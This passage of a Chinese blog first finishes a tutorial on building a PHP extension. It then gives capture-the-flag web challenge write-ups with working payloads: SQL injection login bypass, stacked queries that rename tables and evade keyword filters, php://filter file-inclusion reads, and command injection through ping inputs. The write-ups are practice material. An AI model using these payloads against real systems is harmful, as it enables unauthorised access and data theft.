class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_helloword.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; void helloword_test1()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test1)</span><br><span class="line">&#123;</span><br><span class="line">	ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line"></span><br><span class="line">	php_printf(<span class="string">&quot;The extension %s is loaded and working!\r\n&quot;</span>, <span class="string">&quot;helloword&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; string helloword_test2( [ string $var ] )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_FUNCTION(helloword_test2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *var = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">	<span class="keyword">size_t</span> var_len = <span class="keyword">sizeof</span>(<span class="string">&quot;World&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">	zend_string *retval;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">		<span class="function">Z_PARAM_OPTIONAL</span></span><br><span class="line"><span class="function">		<span class="title">Z_PARAM_STRING</span><span class="params">(var, var_len)</span></span></span><br><span class="line"><span class="function">	<span class="title">ZEND_PARSE_PARAMETERS_END</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Hello %s&quot;</span>, var);</span><br><span class="line"></span><br><span class="line">	RETURN_STR(retval);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_HELLOWORD)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(helloword)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;helloword support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, <span class="number">0</span>)</span><br><span class="line">	ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry helloword_functions[] = &#123;</span><br><span class="line">	PHP_FE(helloword_test1,		arginfo_helloword_test1)</span><br><span class="line">	PHP_FE(helloword_test2,		arginfo_helloword_test2)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; helloword_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry helloword_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;helloword&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	helloword_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(helloword),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(helloword),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_HELLOWORD_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_HELLOWORD</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(helloword)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>需要注意的是，在php7.3以上，<code>ext_skel</code>这个shell变成了<code>ext_skel.php</code>，所以我们使用如下来创建</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/www/server/php/73/bin/php ./ext_skel.php --ext helloword</span><br><span class="line">/www/server/php/73/bin/phpize</span><br><span class="line">./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config</span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-加载模块"   >
          <a href="#3-加载模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-加载模块" class="headerlink" title="3.加载模块"></a>3.加载模块</h2>
      
        <h3 id="方法一："   >
          <a href="#方法一：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3>
      <p>直接<code>make install</code>，然后在对应的php.ini中添加<code>extension=helloword.so</code></p>

        <h3 id="方法二："   >
          <a href="#方法二：" class="heading-link"><i class="fas fa-link"></i></a><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3>
      <p>复制modules下的helloworld.so模块到对应的php扩展目录</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/</span><br></pre></td></tr></table></div></figure>

<p>同样也得在php.ini中添加extension</p>
<p>之后使用模板中函数测试即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">helloword_test1();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>如下即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101910792.png"></p>
<p>这个php拓展模块其实跟linux内核有点像</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/%E9%99%AAXX%E7%9A%84WebBUU%E5%88%B7%E9%A2%98(%E4%B8%80)/">陪XX的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、EasySQL"   >
          <a href="#一、EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、EasySQL" class="headerlink" title="一、EasySQL"></a>一、EasySQL</h1>
      
        <h2 id="🔺SQL注入登录"   >
          <a href="#🔺SQL注入登录" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺SQL注入登录" class="headerlink" title="🔺SQL注入登录"></a>🔺SQL注入登录</h2>
      <p>简单的SQL注入</p>

        <h2 id="1-查看网页源代码"   >
          <a href="#1-查看网页源代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看网页源代码" class="headerlink" title="1.查看网页源代码"></a>1.查看网页源代码</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png" alt="image-20220106105755040"></p>
<p>可以看到是check.php在对登录按钮进行操作，使用的方法是GET，加上题目提示是SQL注入，所以就直接尝试SQL注入。</p>

        <h2 id="2-注入原理"   >
          <a href="#2-注入原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-注入原理" class="headerlink" title="2.注入原理"></a>2.注入原理</h2>
      <p>由于SQL注入中涉及单引号和双引号，且对字符串的处理基本都是单引号进行处理，检测一下，倘若我们使用双引号进行注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &quot;1&quot;=&quot;1&amp;password=aaa&#x27; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></div></figure>

<p>那么出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png" alt="image-20220106110800649"></p>
<p>那么采用单引号进行注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=aaa&#x27; or &#x27;1&#x27;=&#x27;1&amp;password=aaa&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></div></figure>

<p>之后即可成功</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png" alt="image-20220106142353692"></p>
<p>二、</p>
<p>1.HTML标签</p>
<p>meta标签</p>

        <h1 id="三、-极客大挑战-2019-Havefun1"   >
          <a href="#三、-极客大挑战-2019-Havefun1" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-极客大挑战-2019-Havefun1" class="headerlink" title="三、[极客大挑战 2019]Havefun1"></a>三、[极客大挑战 2019]Havefun1</h1>
      
        <h2 id="🔺简单查询"   >
          <a href="#🔺简单查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺简单查询" class="headerlink" title="🔺简单查询"></a>🔺简单查询</h2>
      <p>查看源代码，跳过css和style部分</p>
<p>可以看到注释部分的提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png" alt="image-20220107114730804"></p>
<p>即当cat=dog时，就会输出Syc{cat_cat_cat}，但是一般这都是作者给的提示，实际输出内容可能不是Syc{cat_cat_cat}，所以先尝试一波</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?cat=dog</span><br></pre></td></tr></table></div></figure>

<p>直接出flag了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png" alt="image-20220107114926958"></p>

        <h1 id="四、-ACTF2020-新生赛-Include"   >
          <a href="#四、-ACTF2020-新生赛-Include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-ACTF2020-新生赛-Include" class="headerlink" title="四、[ACTF2020 新生赛]Include"></a>四、[ACTF2020 新生赛]Include</h1>
      
        <h2 id="🔺PHP伪协议"   >
          <a href="#🔺PHP伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺PHP伪协议" class="headerlink" title="🔺PHP伪协议"></a>🔺PHP伪协议</h2>
      
        <h2 id="1-前置探索"   >
          <a href="#1-前置探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置探索" class="headerlink" title="1.前置探索"></a>1.前置探索</h2>
      <p>点击tips之后发现输出提示，获取到使用file协议的flag.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png" alt="image-20220107120937019"></p>
<p>查看flag.php的网页源代码但是什么也没有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png" alt="image-20220107121010226"></p>
<p>之后尝试利用php的伪协议来读取flag.php的源代码</p>

        <h2 id="2-php伪协议利用"   >
          <a href="#2-php伪协议利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-php伪协议利用" class="headerlink" title="2.php伪协议利用"></a>2.php伪协议利用</h2>
      <p>这个比较复杂，之后再专门总结一下，反正这里涉及了file，那么尝试用该协议的payload来读取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p>这里给出的是比较普遍性的，用base64来进行获取的，读取之后得到base64编码的一串字符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png" alt="image-20220107121629962"></p>

        <h2 id="3-base64解码"   >
          <a href="#3-base64解码" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-base64解码" class="headerlink" title="3.base64解码"></a>3.base64解码</h2>
      <p>获取到上面的base64编码后，运用CyberChef解码即可得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png" alt="image-20220107121805266"></p>

        <h1 id="五、-强网杯-2019-随便注1"   >
          <a href="#五、-强网杯-2019-随便注1" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-强网杯-2019-随便注1" class="headerlink" title="五、[强网杯 2019]随便注1"></a>五、[强网杯 2019]随便注1</h1>
      
        <h2 id="🔺SQL注入-三种姿势"   >
          <a href="#🔺SQL注入-三种姿势" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺SQL注入-三种姿势" class="headerlink" title="🔺SQL注入+三种姿势"></a>🔺SQL注入+三种姿势</h2>
      <p>可以先用单引号判断是否存在SQL注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;</span><br></pre></td></tr></table></div></figure>

<p>出现如下，出错则代表存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png" alt="image-20220107125314983"></p>
<p>那么先查询存在的表</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show tables;#</span><br></pre></td></tr></table></div></figure>

<p>发现有如下两个表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png" alt="image-20220107162320203"></p>
<p>然后分别查看一下对应的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from words;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png" alt="image-20220107162923778"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png" alt="image-20220107162957623"></p>
<p>那么flag就在表1919810931114514中，注意查询数字表的时候需要加<strong>反引号`</strong></p>

        <h2 id="解析words表"   >
          <a href="#解析words表" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析words表" class="headerlink" title="解析words表"></a>解析words表</h2>
      <p>那么由于输入1，2会出现如下数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png" alt="image-20220107164211829"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png" alt="image-20220107164221323"></p>
<p>这里的第二个数据段是字符型，那么就应该是在表words中，此时就大概是如下的表格</p>
<div class="table-container"><table>
<thead>
<tr>
<th>id</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>hahahah</td>
</tr>
<tr>
<td>2</td>
<td>miaomiaomiao</td>
</tr>
</tbody></table></div>

        <h2 id="解析1919810931114514表"   >
          <a href="#解析1919810931114514表" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析1919810931114514表" class="headerlink" title="解析1919810931114514表"></a>解析<code>1919810931114514</code>表</h2>
      <p>依据列大概猜测如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th>flag</th>
</tr>
</thead>
<tbody><tr>
<td>………..不知</td>
</tr>
</tbody></table></div>
<p>这里select被过滤了，无法直接从表1919810931114514中获取所以尝试一下其他的解法。</p>

        <h2 id="1-解法一-改表"   >
          <a href="#1-解法一-改表" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-解法一-改表" class="headerlink" title="1.解法一(改表)"></a>1.解法一(改表)</h2>
      <p>修改表名字，使得保存flag的表1919810931114514名字变为表words，之后把flag字段变为data字段，添加id字段，输入1,2然后就可以打印出flag了。</p>

        <h3 id="1-改名"   >
          <a href="#1-改名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-改名" class="headerlink" title="(1)改名"></a>(1)改名</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-增添id字段"   >
          <a href="#2-增添id字段" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-增添id字段" class="headerlink" title="(2)增添id字段"></a>(2)增添id字段</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; alter table words add id int unsigned not Null auto_increment primary key;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-修改flag为data字段"   >
          <a href="#3-修改flag为data字段" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改flag为data字段" class="headerlink" title="(3)修改flag为data字段"></a>(3)修改flag为data字段</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>


        <h3 id="总的payload"   >
          <a href="#总的payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#总的payload" class="headerlink" title="总的payload"></a>总的payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>

<p>最后输入1提交即可</p>

        <h2 id="2-解法二-open和handler"   >
          <a href="#2-解法二-open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解法二-open和handler" class="headerlink" title="2.解法二(open和handler)"></a>2.解法二(open和handler)</h2>
      <p>利用open和handle关键字</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></div></figure>

<p>这样可以直接读出来表<code>1919810931114514</code>的所有内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png" alt="image-20220107171100441"></p>

        <h2 id="3-解法三-MySQL的预处理"   >
          <a href="#3-解法三-MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-解法三-MySQL的预处理" class="headerlink" title="3.解法三(MySQL的预处理)"></a>3.解法三(MySQL的预处理)</h2>
      <p>利用预处理机制prepare和concat拼接获得select操作，之后execute来执行，这里好像不能小写，可以通过大写来绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` </span><br><span class="line">&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png" alt="image-20220107171702374"></p>

        <h1 id="六、-SUCTF-2019-EasySQL"   >
          <a href="#六、-SUCTF-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-SUCTF-2019-EasySQL" class="headerlink" title="六、[SUCTF 2019]EasySQL"></a>六、[SUCTF 2019]EasySQL</h1>
      <p>涉及知识点有点多</p>

        <h1 id="七、-ACTF2020-新生赛-Exec"   >
          <a href="#七、-ACTF2020-新生赛-Exec" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-ACTF2020-新生赛-Exec" class="headerlink" title="七、[ACTF2020 新生赛]Exec"></a>七、[ACTF2020 新生赛]Exec</h1>
      
        <h2 id="🔺命令执行-寻找flag"   >
          <a href="#🔺命令执行-寻找flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行-寻找flag" class="headerlink" title="🔺命令执行+寻找flag"></a>🔺命令执行+寻找flag</h2>
      
        <h2 id="1-远程命令执行"   >
          <a href="#1-远程命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-远程命令执行" class="headerlink" title="1.远程命令执行"></a>1.远程命令执行</h2>
      <p>一般这种ping的界面，都可能会涉及到命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png" alt="image-20220109120351450"></p>
<p>那么直接尝试一下即可，ping一下本地回环地址</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;pwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png" alt="image-20220109120428320"></p>
<p>可以看到存在远程命令执行，那么就尝试找flag在哪，也就是一个路径搜索。</p>

        <h2 id="2-搜索flag路径"   >
          <a href="#2-搜索flag路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-搜索flag路径" class="headerlink" title="2.搜索flag路径"></a>2.搜索flag路径</h2>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png" alt="image-20220109120604954"></p>
<p>那么去根目录找</p>
<p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png" alt="image-20220109120649283"></p>
<p>可以看到flag，那么直接cat即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /flag</span><br></pre></td></tr></table></div></figure>

<p>得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png" alt="image-20220109120742963"></p>

        <h1 id="八、-极客大挑战-2019-Secret-File"   >
          <a href="#八、-极客大挑战-2019-Secret-File" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、-极客大挑战-2019-Secret-File" class="headerlink" title="八、[极客大挑战 2019]Secret File"></a>八、[极客大挑战 2019]Secret File</h1>
      
        <h2 id="🔺抓包-伪协议"   >
          <a href="#🔺抓包-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺抓包-伪协议" class="headerlink" title="🔺抓包+伪协议"></a>🔺抓包+伪协议</h2>
      
        <h2 id="1-前期探索"   >
          <a href="#1-前期探索" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
      <p>查看源代码，有如下文件，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png" alt="image-20220109121055447"></p>
<p>接着按照提示，但是直接跳转到了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png" alt="image-20220109121144475"></p>
<p>那么中间可能执行太快，这时候就需要抓包来看看具体是怎么执行的。</p>

        <h2 id="2-抓包"   >
          <a href="#2-抓包" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-抓包" class="headerlink" title="2.抓包"></a>2.抓包</h2>
      <p>用BurpSuit抓包，发现有一个action.php，里面有个secr3t.php的提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png" alt="image-20220109183459387"></p>
<p>访问一下secr3t.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png" alt="image-20220109183542434"></p>
<p>提示放在了flag.php，访问之后发现什么也没有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png" alt="image-20220109183616033"></p>
<p>那么这里由于secr3t.php存在file的协议，所以可以尝试使用php伪协议获取flag.php的源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png" alt="image-20220109183730031"></p>
<p>拿到CyberChef解密，得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png" alt="image-20220109183825033"></p>

        <h1 id="九、-极客大挑战-2019-LoveSQL"   >
          <a href="#九、-极客大挑战-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、-极客大挑战-2019-LoveSQL" class="headerlink" title="九、[极客大挑战 2019]LoveSQL"></a>九、[极客大挑战 2019]LoveSQL</h1>
      
        <h1 id="十、-GXYCTF2019-Ping-Ping-Ping"   >
          <a href="#十、-GXYCTF2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="十、[GXYCTF2019]Ping Ping Ping"></a>十、[GXYCTF2019]Ping Ping Ping</h1>
      
        <h2 id="🔺命令执行"   >
          <a href="#🔺命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺命令执行" class="headerlink" title="🔺命令执行"></a>🔺命令执行</h2>
      
        <h2 id="1-前期探索-1"   >
          <a href="#1-前期探索-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前期探索-1" class="headerlink" title="1.前期探索"></a>1.前期探索</h2>
      <p>Ping提示+ip，应该是命令执行，直接ls试试</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png" alt="image-20220110200315404"></p>
<p>发现flag，尝试cat</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat flag.php</span><br></pre></td></tr></table></div></figure>

